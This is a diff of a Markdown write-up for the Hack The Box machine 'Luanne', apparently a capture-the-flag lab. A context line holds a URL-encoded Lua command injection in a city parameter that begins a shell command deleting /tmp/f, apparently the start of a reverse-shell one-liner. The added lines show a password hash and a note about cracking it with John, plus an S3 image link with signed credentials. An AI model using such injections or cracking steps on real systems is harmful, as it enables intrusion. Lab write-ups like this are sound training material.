@@ -101,8 +101,13 @@ http://luanne.htb/weather/forecast?city=%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff
 ```html
 webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
 ```
+* added to luanneWepApi.txt 
 
-![]()
+> **we have to crack this hash, so Used john to crack it**
+
+![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/98100502-7a21-44e9-a307-71009920d1f5/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T000029Z&X-Amz-Expires=86400&X-Amz-Signature=ba06437302ef5bb61103ad4745f4a1173b7f3ef368623bb14d2824626fb64d01&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)
+
+
 ![]()
 ![]()
 ![]()
